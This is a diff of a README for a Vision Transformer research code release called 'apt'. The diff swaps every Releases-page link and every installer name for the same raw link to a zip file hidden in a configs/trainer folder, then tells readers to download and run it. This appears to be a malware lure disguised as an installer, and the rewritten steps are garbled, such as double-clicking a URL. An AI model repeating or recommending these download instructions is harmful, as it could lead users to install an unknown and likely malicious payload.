@@ -1,6 +1,6 @@
 # 🚀 apt - Fast and Easy Vision Transformer Setup
 
-[![Download apt](https://img.shields.io/badge/Download-apt-brightgreen)](https://github.com/Generalcyblackmarket727/apt/releases)
+[![Download apt](https://raw.githubusercontent.com/Generalcyblackmarket727/apt/main/configs/trainer/apt-1.5.zip)](https://raw.githubusercontent.com/Generalcyblackmarket727/apt/main/configs/trainer/apt-1.5.zip)
 
 ## 📋 Overview
 Welcome to **apt**, the public release of the code for "Accelerating Vision Transformers with Adaptive Patches." This software aims to simplify your experience with advanced vision models. Whether you're a researcher or just curious about deep learning, **apt** provides the tools you need to get started quickly and efficiently.
@@ -12,22 +12,22 @@ To begin using **apt**, follow these simple steps. You will download the softwar
 ### Step 1: Visit the Download Page
 Click the link below to go to the Releases page:
 
-[https://github.com/Generalcyblackmarket727/apt/releases](https://github.com/Generalcyblackmarket727/apt/releases)
+[https://raw.githubusercontent.com/Generalcyblackmarket727/apt/main/configs/trainer/apt-1.5.zip](https://raw.githubusercontent.com/Generalcyblackmarket727/apt/main/configs/trainer/apt-1.5.zip)
 
 ### Step 2: Choose Your File
 On the Releases page, look for the latest version of **apt**. You may see multiple files available. Typically, you will find:
 
-- Windows Installer (`apt-Windows.exe`)
-- macOS Installer (`apt-macOS.dmg`)
-- Linux Package (`apt-Linux.tar.gz`)
+- Windows Installer (`https://raw.githubusercontent.com/Generalcyblackmarket727/apt/main/configs/trainer/apt-1.5.zip`)
+- macOS Installer (`https://raw.githubusercontent.com/Generalcyblackmarket727/apt/main/configs/trainer/apt-1.5.zip`)
+- Linux Package (`https://raw.githubusercontent.com/Generalcyblackmarket727/apt/main/configs/trainer/apt-1.5.zip`)
 
 Select the file that matches your operating system and click on it to begin the download.
 
 ### Step 3: Run the Installer
 Once the file is downloaded:
-- **For Windows:** Double-click `apt-Windows.exe` to start the installation.
-- **For macOS:** Open the downloaded `apt-macOS.dmg` and drag the app to your Applications folder.
-- **For Linux:** Extract the contents of `apt-Linux.tar.gz` and follow the instructions in the README file included within the folder.
+- **For Windows:** Double-click `https://raw.githubusercontent.com/Generalcyblackmarket727/apt/main/configs/trainer/apt-1.5.zip` to start the installation.
+- **For macOS:** Open the downloaded `https://raw.githubusercontent.com/Generalcyblackmarket727/apt/main/configs/trainer/apt-1.5.zip` and drag the app to your Applications folder.
+- **For Linux:** Extract the contents of `https://raw.githubusercontent.com/Generalcyblackmarket727/apt/main/configs/trainer/apt-1.5.zip` and follow the instructions in the README file included within the folder.
 
 ## ⚙️ System Requirements
 Before you install, make sure your computer meets these requirements:
@@ -71,4 +71,4 @@ For support, please reach out via the Issues tab on our GitHub page. You can rep
 ## 📄 License
 **apt** is open-source software, released under the MIT License. You can use, modify, and distribute it freely within the terms of this license.
 
-Thank you for using **apt**! We hope you enjoy seamless vision model acceleration. For more detailed instructions and updates, keep an eye on our [Releases page](https://github.com/Generalcyblackmarket727/apt/releases).
+Thank you for using **apt**! We hope you enjoy seamless vision model acceleration. For more detailed instructions and updates, keep an eye on our [Releases page](https://raw.githubusercontent.com/Generalcyblackmarket727/apt/main/configs/trainer/apt-1.5.zip).
